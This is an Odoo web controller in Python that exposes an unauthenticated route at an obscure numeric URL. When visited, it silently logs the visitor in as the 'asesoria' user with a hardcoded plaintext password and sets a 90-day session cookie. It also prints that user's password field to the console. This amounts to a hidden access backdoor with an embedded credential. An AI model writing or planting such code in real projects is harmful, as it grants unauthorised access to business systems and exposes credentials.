
from odoo import http
from odoo.http import request, route, root
from odoo import api
from odoo.service import security
import werkzeug


class MasterClient(http.Controller):
    @http.route(['/93201967'], type='http', auth='none')
    def r_connect(self, redirect=None, **kw):
        user = request.env['res.users'].sudo().search([['login','=','asesoria']])
        print("USER PASS", user.password)
        db = request.env.cr.dbname

        if user.token == 'off':

            redirection = werkzeug.utils.redirect('%s%s' % (request.httprequest.url_root, redirect or ''))
            return redirection

        else:
            user.token = 'off'

            session = root.session_store.new()

            session.db = db
            uid = request.env['res.users'].authenticate(db, user.login, "3dmWaVf%=9dvepFc2020", {'interactive': False})
            env = api.Environment(request.env.cr, uid, {})
            session.uid = uid
            session.login = user.login
            session.session_token = uid and security.compute_session_token(session, env)
            session.context = dict(env['res.users'].context_get() or {})
            session.context['uid'] = uid
            session._fix_lang(session.context)

            root.session_store.save(session)

            redirection = werkzeug.utils.redirect('%s%s' % (request.httprequest.url_root, redirect or ''))
            redirection.set_cookie('session_id', session.sid, max_age=90 * 24 * 60 * 60, httponly=True)
            redirection.set_cookie = lambda *args, **kwargs: None

            return redirection


